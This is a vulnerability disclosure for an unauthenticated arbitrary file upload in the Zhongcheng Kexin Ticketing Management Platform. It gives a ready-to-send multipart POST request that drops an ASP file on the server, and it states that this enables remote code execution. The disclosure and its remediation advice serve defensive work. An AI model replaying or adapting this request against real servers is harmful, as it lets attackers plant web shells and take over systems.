# Zhongcheng Kexin Ticketing Management Platform Aribitrary File Upload

## vulnerability Abstractty Abstract

There is one File Upload  vulnerability in Zhongcheng Kexin Ticketing Management Platform,which can be exploited by attackers to Obtain system permissions.



## Scope of influence

Zhongcheng Kexin Ticketing Management Platform All versions.





## vulnerability Reappearance

![image-20240417151706852](https://gitee.com/yuejinjianke/tuchuang/raw/master/image/image-20240417151706852.png)

It shows like this.



Send the following data packet.

```
POST /SystemManager/Introduction.ashx HTTP/1.1
Host: {{hostname}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
Connection: close
Content-Length: 497
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: multipart/form-data; boundary=--------------------------354575237365372692397370
Accept-Encoding: gzip


----------------------------354575237365372692397370
Content-Disposition: form-data; name="file"; filename="5.txt"
Content-Type: image/jpeg

<% Response.Write("c7ff66de90f5b695091cc4826d22d137") %>

----------------------------354575237365372692397370
Content-Disposition: form-data; name="fileName"

5.asp
----------------------------354575237365372692397370
Content-Disposition: form-data; name="Method"

UpdateUploadLinkPic
----------------------------354575237365372692397370
```

If the echo is as follows, it indicates that the file upload was successful.

![image-20240417152300237](https://gitee.com/yuejinjianke/tuchuang/raw/master/image/image-20240417152300237.png)

Access the relevant webpage according to the echo path.

![image-20240417152415701](https://gitee.com/yuejinjianke/tuchuang/raw/master/image/image-20240417152415701.png)

It can be seen that the ASP statement has been successfully parsed, and the file has been uploaded successfully.



view the source code now.

![image-20240417152909350](https://gitee.com/yuejinjianke/tuchuang/raw/master/image/image-20240417152909350.png)



Unauthorized remote attackers can upload malicious files to the server

   and remotely execute arbitrary code to gain system privileges.



Suggestion: Timely update to the latest version, use whitelist for verification, and save uploaded files in a non web accessible directory.





yueji0j1anke